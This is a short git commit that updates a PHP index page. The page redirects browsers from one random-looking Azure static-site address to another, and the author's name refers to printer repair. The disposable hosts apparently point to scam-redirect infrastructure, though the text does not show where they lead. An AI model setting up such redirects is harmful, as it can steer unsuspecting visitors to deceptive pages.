61721796b0f35b2a66a322d98f3274d1772d6b20
repairprinters379 <repairprinters379@gmail.com>
2025-01-13 21:53:13 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://mac977fix768core87jds.z12.web.core.windows.net/");
+header("Location: https://kalludadahahah.z33.web.core.windows.net/");
  
 exit;
 ?>
